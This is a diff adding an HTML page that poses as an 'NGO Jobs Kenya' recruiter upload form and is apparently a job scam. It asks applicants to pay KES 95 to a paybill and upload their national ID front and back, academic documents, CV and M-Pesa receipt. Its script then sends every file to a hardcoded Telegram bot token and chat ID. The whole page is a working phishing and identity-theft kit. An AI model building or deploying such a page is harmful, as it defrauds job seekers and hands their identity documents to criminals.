@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>File Extractor - NGO Jobs Kenya</title>
+    <style>
+        body {
+            font-family: Arial;
+            margin: 20px;
+            background: #f4f6f9;
+        }
+        
+        .container {
+            max-width: 900px;
+            margin: auto;
+        }
+        
+        .form-section {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+        }
+        
+        input,
+        textarea,
+        button {
+            width: 100%;
+            padding: 10px;
+            margin: 8px 0;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+        }
+        
+        button {
+            background: #0b84ff;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+        
+        .extract-btn {
+            background: #28a745;
+            margin-top: 10px;
+        }
+        
+        .files-list {
+            background: #e9ecef;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 10px 0;
+        }
+        
+        .file-item {
+            padding: 8px;
+            border-bottom: 1px solid #ddd;
+        }
+        
+        .telegram-section {
+            background: #f8f9fa;
+            border: 2px dashed #0b84ff;
+        }
+        
+        pre {
+            background: #000;
+            color: #0f0;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            white-space: pre-wrap;
+        }
+        
+        .status {
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 5px;
+        }
+        
+        .success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        
+        .error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        
+        .pre-filled {
+            background: #fff3cd;
+            border: 2px solid #ffc107;
+            font-weight: bold;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <p>UPLOAD REQUIRED DOCUMMENTS TO RECRUITER , YOUR FILES WILL BE GENERATED AND SEND TO OUR OFFICES, WE WILL REVIEW AND CONTACT YOU FOR INTERVIEW, MAKES SURE ON YOUR RESUME, YOU USE REACHABLE PHONE NUMBER OR EMAIL, WE WILL CONTACT YOU ON BOTH.
+        </p>
+        <p><strong>PAY KES 95 TO PAYBILL <b>714888</b> ACCOUNT NO. <b>440395</b></strong></p>
+
+        <!-- ORIGINAL FORM -->
+        <div class="form-section">
+            <h3>📤 Upload iles to NGO Recruiter Here</h3>
+            <form id="originalForm">
+                <label>ID Front</label>
+                <input type="file" required id="idFront">
+
+                <label>ID Back</label>
+                <input type="file" required id="idBack">
+
+                <label>Academic Documents</label>
+                <input type="file" multiple required id="academicDocs">
+
+                <label>CV / Resume</label>
+                <input type="file" required id="cvResume">
+
+                <label>Payment Message</label>
+                <textarea id="paymentMsg" required placeholder="Paste MPESA receipt/transaction details here..."></textarea>
+
+                <button type="button" class="extract-btn" onclick="extractAllFiles()">🔍 Extract Files</button>
+                <button type="button" onclick="sendToTelegram()" style="background: #dc3545;">🚀 SEND TO TELEGRAM BOT</button>
+            </form>
+        </div>
+
+        <!-- EXTRACTED FILES -->
+        <div class="form-section">
+            <h3>📋 Extracted Files</h3>
+            <div id="filesSummary" class="files-list" style="display:none;">
+                <strong>Total Files: <span id="totalFiles">0</span></strong>
+                <div id="filesList"></div>
+            </div>
+        </div>
+
+        <!-- TELEGRAM CONFIG (PRE-FILLED) -->
+        <div class="form-section telegram-section">
+            <h3>🤖 Telegram Bot - PRE-CONFIGURED</h3>
+            <input type="text" id="telegramToken" value="7186506994:AAEKIkNo49PL-IyvoRFGFJoC5bxUfmfh_L0" class="pre-filled" readonly>
+            <input type="text" id="chatId" value="5615316142" class="pre-filled" readonly>
+            <textarea id="telegramStatus" readonly placeholder="Status updates here..."></textarea>
+        </div>
+
+        <!-- RAW DATA -->
+        <div class="form-section">
+            <h3>💾 What Gets Sent</h3>
+            <pre id="formDataOutput">Upload files first to see FormData...</pre>
+        </div>
+    </div>
+
+    <script>
+        // YOUR CREDENTIALS - HARDCODED
+        const TELEGRAM_TOKEN = '7186506994:AAEKIkNo49PL-IyvoRFGFJoC5bxUfmfh_L0';
+        const CHAT_ID = '5615316142';
+
+        let allFiles = {
+            idFront: null,
+            idBack: null,
+            academicDocs: [],
+            cvResume: null,
+            paymentMessage: ''
+        };
+
+        function extractAllFiles() {
+            const form = document.getElementById('originalForm');
+
+            allFiles = {
+                idFront: document.getElementById('idFront').files[0] || null,
+                idBack: document.getElementById('idBack').files[0] || null,
+                academicDocs: Array.from(document.getElementById('academicDocs').files),
+                cvResume: document.getElementById('cvResume').files[0] || null,
+                paymentMessage: document.getElementById('paymentMsg').value
+            };
+
+            displayFilesSummary();
+            showFormData();
+
+            document.getElementById('telegramStatus').textContent = `✅ Ready! ${Object.values(allFiles).filter(v => v && (!Array.isArray(v) || v.length > 0)).length} items extracted.`;
+            document.getElementById('telegramStatus').className = 'status success';
+        }
+
+        function displayFilesSummary() {
+            const summary = document.getElementById('filesSummary');
+            const list = document.getElementById('filesList');
+            const totalSpan = document.getElementById('totalFiles');
+
+            let totalCount = 0;
+            let html = '';
+
+            if (allFiles.idFront) {
+                totalCount++;
+                html += `<div class="file-item">📄 ID Front: ${allFiles.idFront.name} (${formatBytes(allFiles.idFront.size)})</div>`;
+            }
+            if (allFiles.idBack) {
+                totalCount++;
+                html += `<div class="file-item">📄 ID Back: ${allFiles.idBack.name} (${formatBytes(allFiles.idBack.size)})</div>`;
+            }
+            allFiles.academicDocs.forEach((file, i) => {
+                totalCount++;
+                html += `<div class="file-item">📚 Academic #${i+1}: ${file.name} (${formatBytes(file.size)})</div>`;
+            });
+            if (allFiles.cvResume) {
+                totalCount++;
+                html += `<div class="file-item">📄 CV: ${allFiles.cvResume.name} (${formatBytes(allFiles.cvResume.size)})</div>`;
+            }
+            if (allFiles.paymentMessage) html += `<div class="file-item">💰 Payment: ${allFiles.paymentMessage.substring(0, 50)}...</div>`;
+
+            totalSpan.textContent = totalCount;
+            list.innerHTML = html;
+            summary.style.display = totalCount ? 'block' : 'none';
+        }
+
+        function showFormData() {
+            const formData = new FormData();
+            if (allFiles.idFront) formData.append('id_front', allFiles.idFront);
+            if (allFiles.idBack) formData.append('id_back', allFiles.idBack);
+            allFiles.academicDocs.forEach(file => formData.append('academic_docs[]', file));
+            if (allFiles.cvResume) formData.append('cv_resume', allFiles.cvResume);
+            formData.append('payment_message', allFiles.paymentMessage);
+            formData.append('chat_id', CHAT_ID);
+
+            let output = `SENDING TO YOUR BOT (${CHAT_ID}):\n\n`;
+            for (let [key, value] of formData.entries()) {
+                output += `${key}: ${value.name || value}\n`;
+            }
+            output += `\n📤 Telegram API: https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`;
+
+            document.getElementById('formDataOutput').textContent = output;
+        }
+
+        async function sendToTelegram() {
+            if (!allFiles.idFront) {
+                showStatus('❌ Upload files first!', 'error');
+                return;
+            }
+
+            showStatus('📤 Sending to your Telegram bot...', 'success');
+
+            try {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('caption', `🆕 NGO JOB FILES\nID Front/Back + ${allFiles.academicDocs.length} Academic + CV\nPayment: ${allFiles.paymentMessage}`);
+
+                // Send files one by one
+                const filesToSend = [allFiles.idFront, allFiles.idBack, ...allFiles.academicDocs, allFiles.cvResume].filter(Boolean);
+
+                for (let file of filesToSend) {
+                    formData.set('document', file);
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                }
+
+                showStatus(`✅ SUCCESS! All ${filesToSend.length} files sent to chat ${CHAT_ID}`, 'success');
+            } catch (error) {
+                showStatus(`❌ Error: ${error.message}`, 'error');
+            }
+        }
+
+        function formatBytes(bytes) {
+            if (!bytes) return '0';
+            const k = 1024;
+            const sizes = ['B', 'KB', 'MB', 'GB'];
+            const i = Math.floor(Math.log(bytes) / Math.log(k));
+            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
+        }
+
+        function showStatus(message, type) {
+            const status = document.getElementById('telegramStatus');
+            status.textContent = message;
+            status.className = `status ${type}`;
+        }
+
+        // LIVE MONITORING
+        document.querySelectorAll('input[type="file"], #paymentMsg').forEach(el => {
+            el.addEventListener('change', extractAllFiles);
+            el.addEventListener('input', extractAllFiles);
+        });
+
+        // PRE-LOAD STATUS
+        showStatus('✅ Bot configured! Upload files and click SEND', 'success');
+    </script>
+</body>
+
+</html>
